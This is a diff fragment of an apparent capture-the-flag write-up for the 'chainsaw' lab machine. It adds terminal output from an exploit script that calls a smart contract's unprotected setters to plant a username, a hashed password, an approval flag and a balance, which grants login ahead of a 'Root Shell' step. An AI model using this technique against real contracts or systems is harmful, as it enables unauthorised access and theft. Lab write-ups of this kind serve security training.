@@ -579,9 +579,26 @@ To make our exploit work we need to meet certain conditions:
 + Approve our user 
 + Transfer enough  funds to join  the club 
 
+```python
 
-Full Exploit
-
+➜  chainsaw python3 prives.py 0x5e83B952523Ec2551bbA99EC79791dBd7bd93621 d3 dog@1
+[+] Starting
+[+] Connecting to localhost:63991
+[*] Connection Established
+[+] Creating the contract representation
+[+] Address: 0x5e83B952523Ec2551bbA99EC79791dBd7bd93621
+[*] Done
+[+] Calling setUsername() with: d3
+[*] Done. getUsername(): d3
+[+] Calling setPassword() with: 091422dcd317eb871d4f5dca91cda85a (dog@1)
+[*] Done. getPassword(): 091422dcd317eb871d4f5dca91cda85a
+[+] Calling setApprove() with: True
+[*] Done. getApprove(): True
+[+] Calling transfer() with: 1000
+[*] Done. getBalance(): 1000
+[+] Exploit finished. Now you can login with the provided credentials: d3:dog@1, Exiting...
+➜  chainsaw 
+```
 
 ##### Root Shell
 
